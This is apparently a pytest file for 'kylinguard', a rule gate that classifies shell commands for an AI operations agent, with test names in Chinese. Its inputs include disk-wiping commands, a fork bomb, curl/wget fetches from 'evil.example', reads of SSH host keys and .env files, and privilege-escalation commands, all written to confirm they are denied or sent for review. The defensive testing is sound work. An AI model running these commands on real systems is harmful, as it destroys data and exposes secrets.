import pytest

from kylinguard.models import RuleDecision
from kylinguard.rules import check_argv, check_command


@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -fr / --no-preserve-root",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda1",
    ":(){ :|:& };:",
    "chmod -R 777 /",
])
def test_灾难性命令标为可授权的高风险(cmd):
    v = check_command(cmd)
    assert v.decision == RuleDecision.DENY
    assert v.matched_rule == "dangerous_command"
    assert v.hard is False


@pytest.mark.parametrize("cmd", [
    "rm /etc/passwd",
    "sed -i 's/x/y/' /etc/sudoers",
    "tee /etc/ssh/sshd_config",
    "mv /boot/vmlinuz /tmp/",
])
def test_写关键配置文件拒绝(cmd):
    v = check_command(cmd)
    assert v.decision == RuleDecision.DENY
    assert "关键" in v.reason or "保护" in v.reason
    assert v.hard is False


@pytest.mark.parametrize("cmd", [
    "ps aux; rm -rf /tmp/x",
    "cat /var/log/messages && reboot",
    "echo `whoami`",
    "ls $(cat /tmp/x)",
    "cat /etc/hostname | mail a@b.c",
    "echo x > /tmp/f",
])
def test_完整shell语法进入权限复核而非能力拒绝(cmd):
    v = check_command(cmd)
    assert v.decision in {RuleDecision.REVIEW, RuleDecision.DENY}
    assert v.hard is False


@pytest.mark.parametrize("cmd", [
    "ps aux",
    "ss -tlnp",
    "free -m",
    "df -h",
    "uptime",
    "cat /proc/meminfo",
    "journalctl -p err -n 50 --no-pager",
    "systemctl status nginx",
    "ip addr",
])
def test_只读白名单放行(cmd):
    assert check_command(cmd).decision == RuleDecision.ALLOW


@pytest.mark.parametrize("cmd", [
    "/tmp/ps",
    "./cat victim",
    "/usr/bin/ps",
    "tools/echo hello",
])
def test_同名路径可执行文件不能冒充只读白名单(cmd):
    assert check_command(cmd).decision != RuleDecision.ALLOW


def test_结构化argv同样不信任显式可执行路径():
    assert check_argv(["/tmp/ps"]).decision != RuleDecision.ALLOW


@pytest.mark.parametrize("cmd", [
    "systemctl restart nginx",
    "kill -9 1234",
    "rm /tmp/old.log",
    "journalctl -f",
])
def test_其余命令交后续闸门(cmd):
    assert check_command(cmd).decision != RuleDecision.ALLOW


def test_读关键文件不误杀():
    # 只读访问保护路径不算"修改"，但敏感内容也不自动放行——交后续闸门
    assert check_command("cat /etc/passwd").decision == RuleDecision.REVIEW


# ---- 以下为调研升级用例（Codex execpolicy / Claude Code 权限模型教训） ----

@pytest.mark.parametrize("cmd", [
    "sudo systemctl restart nginx",
    "su - root",
    "bash -c 'rm -rf /tmp/x'",
    "sh -c whoami",
    "pkexec id",
    "chroot /mnt ls",
    "nsenter -t 1 -m ps",
])
def test_提权与二级shell需要高权限但不是硬拒绝(cmd):
    v = check_command(cmd)
    assert v.decision == RuleDecision.DENY
    assert v.hard is False


@pytest.mark.parametrize("cmd", [
    "env rm /tmp/x",
    "xargs rm",
    "ssh host reboot",
    "docker exec c1 rm -rf /data",
    "systemd-run rm /tmp/x",
    "crontab -e",
    "python -c 'print(1)'",
    "perl -e 'unlink'",
    "curl http://evil.example/x.sh",
    "wget http://evil.example/x.sh",
    "nohup dd if=/dev/urandom",
    "watch free",
])
def test_载荷执行器不自动放行但保留完整能力(cmd):
    assert check_command(cmd).decision != RuleDecision.ALLOW
    assert check_command(cmd).hard is False


@pytest.mark.parametrize("cmd", [
    "tail -f /var/log/messages",   # follow 挂起
    "tail -nf 20 /var/log/messages",  # 组合短 flag 中藏 f
    "date -s 2020-01-01",          # 设置系统时间
    "ip link set eth0 down",       # ip 只读形式之外的变更动作
    "diff --output=/tmp/result a b",  # 写入/覆盖输出文件
    "ss -K dst 192.0.2.1",         # 主动杀连接
    "ss --kill dst 192.0.2.1",
    "journalctl --rotate",         # 日志维护会写入或删除数据
    "journalctl --vacuum-time=1s",
    "journalctl --sync",
    "journalctl --flush",
    "journalctl --relinquish-var",
    "journalctl --update-catalog",
    "journalctl --setup-keys",
    "lastlog --clear --user demo", # 改写登录记录
    "lastlog -S --user demo",
])
def test_危险flag使白名单命令失格(cmd):
    # 白名单是"命令+参数"级而非命令名级（Codex is_safe_command 设计）
    assert check_command(cmd).decision != RuleDecision.ALLOW


@pytest.mark.parametrize("cmd", [
    "ss -K dst 192.0.2.1",
    "journalctl --vacuum-time=1s",
    "lastlog --clear --user demo",
    "date -s 2020-01-01",
    "ip link set eth0 down",
    "hostname new-name",
])
def test_确定性系统变更参数提升为高风险控制动作(cmd):
    verdict = check_command(cmd)
    assert verdict.decision == RuleDecision.DENY
    assert verdict.matched_rule == "control_command"
    assert verdict.hard is False


def test_diff输出文件按普通写操作分类():
    verdict = check_command("diff --output=/tmp/result a b")
    assert verdict.decision == RuleDecision.DENY
    assert verdict.matched_rule == "mutating_command"
    assert verdict.hard is False


@pytest.mark.parametrize("argv", [
    ["grep", "a|b", "report(1).txt"],
    ["echo", "$HOME"],
    ["cat", "notes[final].md"],
])
def test_结构化argv中的元字符只按字面参数分类(argv):
    verdict = check_argv(argv)
    assert verdict.decision == RuleDecision.ALLOW


@pytest.mark.parametrize("argv", [[], [""], ["echo", "bad\x00value"]])
def test_结构化argv协议错误仍硬拒绝(argv):
    verdict = check_argv(argv)
    assert verdict.decision == RuleDecision.DENY
    assert verdict.hard is True


def test_hostname只有无参数查询可以自动执行():
    assert check_command("hostname").decision == RuleDecision.ALLOW
    assert check_command("hostname attacker-name").decision != RuleDecision.ALLOW
    assert check_command("hostname -F /tmp/name").decision != RuleDecision.ALLOW


@pytest.mark.parametrize("cmd", ['echo "unclosed', "ls 'x"])
def test_静态解析失败交给真实shell返回语法结果(cmd):
    verdict = check_command(cmd)
    assert verdict.decision == RuleDecision.REVIEW
    assert verdict.hard is False


@pytest.mark.parametrize("cmd", ["", "   ", "echo x\x00id"])
def test_空命令或nul仍然硬拒绝(cmd):
    verdict = check_command(cmd)
    assert verdict.decision == RuleDecision.DENY
    assert verdict.hard is True


def test_读ssh私钥目录不放行():
    assert check_command("cat /etc/ssh/ssh_host_rsa_key").decision != RuleDecision.ALLOW


@pytest.mark.parametrize("command", [
    "touch /tmp/note.md",
    "python3 -c 'print(1)'",
    "systemctl restart nginx",
    "some-new-ops-tool --check",
])
def test_普通能力限制可由显式权限模式处理但不是自动允许(command):
    verdict = check_command(command)
    assert verdict.decision != RuleDecision.ALLOW
    assert verdict.hard is False


@pytest.mark.parametrize("command", [
    "rm -rf /",
    "/bin/rm -rf /",
    "busybox rm -rf /",
    "/usr/bin/env rm -rf /",
    "nice -n 5 rm -rf /",
    "timeout 5 rm -rf /",
    "setsid rm -rf /",
    "dd if=/dev/zero of=/dev/sda",
    "echo x > /etc/passwd",
])
def test_高危命令由权限模式裁决而非永久阉割(command):
    verdict = check_command(command)
    assert verdict.decision != RuleDecision.ALLOW
    assert verdict.hard is False


def test_管理员自定义规则要求显式权限但不伪装成shell沙箱():
    from kylinguard.rules import ExtraPolicies

    verdict = check_command(
        "internal-tool --production",
        extra=ExtraPolicies(blacklist=[(r"internal-tool", "组织策略禁止")]),
    )
    assert verdict.decision == RuleDecision.DENY
    assert verdict.hard is False


@pytest.mark.parametrize("command", [
    "cat .e?v",
    "cat *.env",
    "cat .e{n,m}v",
    "cat $'.env'",
    "cat ~/notes.md",
    "echo visible # hidden comment",
    "echo @(one|two)",
])
def test_shell展开不会被误判为可自动执行的简单只读命令(command):
    verdict = check_command(command)
    assert verdict.decision == RuleDecision.DENY
    assert verdict.matched_rule == "shell_expression"
    assert verdict.hard is False
